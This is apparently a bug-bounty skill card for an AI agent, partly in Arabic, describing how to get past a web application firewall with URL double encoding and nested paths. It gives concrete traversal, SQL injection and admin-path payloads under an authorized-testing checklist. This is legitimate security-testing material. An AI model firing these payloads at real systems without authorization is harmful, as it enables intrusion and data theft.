# SKILL: WAF bypass via URL normalization: double encoding and nested paths

**Skill id:** `tip/waf-bypass-via-url-normalization-double-encoding-and-nested-paths`  
**Category:** WAF Bypass, SQLi  
**Rating:** ⭐ جيدة  
**Status:** Not started  
**Notion:** https://app.notion.com/p/41ddac31e8808131ae77db3268c2b153  

> **Authorized testing only.** LEAD until validated on accounts/objects you own. Never auto-confirm.

## When the agent should use this skill

- Hunting track involves: **WAF Bypass, SQLi**
- Target signals match this technique
- Scope and testing envelope confirmed

## How It Works

بعض الـWAFs تفحص الشكل الأول من الـURL بينما الـbackend يفك الترميز مرتين أو يطبّع المسارات بشكل مختلف. Double encoding وnested path traversal قد يمرّان الفلتر ويصلان للتطبيق. اختبر فقط على أهداف مصرّح بها وقارن سلوك WAF مقابل origin.

## Payload / Code

```
Double encoding example:
/api/v1/%252e%252e/%252e%252e/config
id=1%2520UNION%2520SELECT%2520secrets--

Nested / unusual paths:
/api/v1/....//....//config
/api/v1;/admin
Always confirm backend executed the decoded form, not just different WAF status.
```

## Source

Omar\_3lsayed tip (X)

## Agent execution contract

1. Confirm asset is in authorized scope.
2. Baseline with an account/object you control.
3. Apply **one** mutation from the payload at a time.
4. Discriminate benign explanations (cache, public data, UI-only).
5. Classify as **LEAD** until unauthorized consequence is proven.
6. Stop if real third-party data appears beyond minimal evidence.
7. Hand off to report template only after validation checklist passes.

---
_Synced from Notion Bug Bounty Tips and Tricks · agent skill ready._
